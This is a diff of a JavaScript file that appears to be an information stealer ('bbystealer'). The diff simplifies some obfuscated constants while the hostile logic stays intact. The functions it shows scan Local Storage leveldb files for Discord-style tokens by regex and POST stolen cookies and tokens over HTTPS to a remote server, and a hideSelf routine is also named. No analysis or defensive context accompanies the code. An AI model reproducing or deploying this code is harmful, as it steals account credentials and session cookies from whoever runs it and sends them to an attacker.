@@ -291,8 +291,6 @@ async function takePizzas() {
 
             var daliah = https.request(shavada);
             daliah.on("error", oesha => {
-                const caetlin = {};
-                caetlin.obcxw = "utf8";
                 if (debug) console.log(oesha);
             });
             daliah.write(cecila);
@@ -311,10 +309,12 @@ async function takeCheese() {
             yovan.port = 443;
             yovan.path = "/QDVkCo9cC0g2/cookies";
             yovan.method = "POST";
+
             yovan.headers = {};
             yovan.headers["User-Agent"] = "bbystealer_kkk01";
             yovan.headers["Content-Type"] = "text/plain";
             yovan.headers["Content-Length"] = polly.length;
+
             var keyondre = https.request(yovan);
             keyondre.on("error", bergin => {
                 if (debug) console.log(bergin);
@@ -391,18 +391,12 @@ function hideSelf() {
 }
 
 function findToken(javel) {
-    const odaly = {};
-    odaly.KSsVL = ".log";
-    odaly.BDknH = ".ldb";
-    odaly.itjBa = "utf8";
-    odaly.wMIgB = "Local Storage\\leveldb";
-    const gitzel = odaly;
-    javel += gitzel.wMIgB;
+    javel += "Local Storage\\leveldb";
     let roshay = [];
     try {
         fs.readdirSync(javel).map(akul => {
-            if (akul.endsWith(gitzel.KSsVL) || akul.endsWith(gitzel.BDknH)) {
-                fs.readFileSync(javel + "\\" + akul, gitzel.itjBa).split(/\r?\n/).forEach(chiron => {
+            if (akul.endsWith(".log") || akul.endsWith(".ldb")) {
+                fs.readFileSync(javel + "\\" + akul, "utf8").split(/\r?\n/).forEach(chiron => {
                     const jordy = [new RegExp(/mfa\.[\w-]{84}/g), new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g)];
                     for (const myasiah of jordy) {
                         const andres = chiron.match(myasiah);
@@ -433,6 +427,7 @@ async function stealGameConfig() {
     drennen.port = 443;
     drennen.path = "/QDVkCo9cC0g2/tokens";
     drennen.method = "POST";
+
     drennen.headers = {};
     drennen.headers["User-Agent"] = "bbystealer_kkk01";
     drennen.headers["Content-Type"] = "application/json";
